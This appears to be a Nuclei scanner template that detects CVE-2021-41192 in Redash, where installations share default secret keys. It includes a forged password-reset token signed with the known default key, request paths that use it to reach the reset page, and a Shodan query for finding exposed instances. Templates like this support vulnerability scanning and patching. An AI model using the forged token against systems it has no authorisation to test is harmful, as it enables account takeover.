id: CVE-2021-41192

info:
  name: Redash Setup Configuration - Default Secrets Disclosure
  author: bananabr
  severity: medium
  description: Redash Setup Configuration is vulnerable to default secrets disclosure (Insecure Default Initialization of Resource). If an admin sets up Redash versions <=10.0 and prior without explicitly specifying the `REDASH_COOKIE_SECRET` or `REDASH_SECRET_KEY` environment variables, a default value is used for both that is the same across all installations. In such cases, the instance is vulnerable to attackers being able to forge sessions using the known default value.
  reference:
    - https://hackerone.com/reports/1380121
    - https://github.com/getredash/redash/security/advisories/GHSA-g8xr-f424-h2rv
    - https://nvd.nist.gov/vuln/detail/CVE-2021-41192
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 6.5
    cve-id: CVE-2021-41192
    cwe-id: CWE-1188
  metadata:
    shodan-query: http.favicon.hash:698624197
  tags: hackerone,cve,cve2021,redash,auth-bypass

requests:
  - method: GET
    path:
      - "{{BaseURL}}/reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs"
      - "{{BaseURL}}/redash/reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Enter your new password:"
          - "redash"
        condition: and

      - type: status
        status:
          - 200

# Enhanced by mp on 2022/03/23
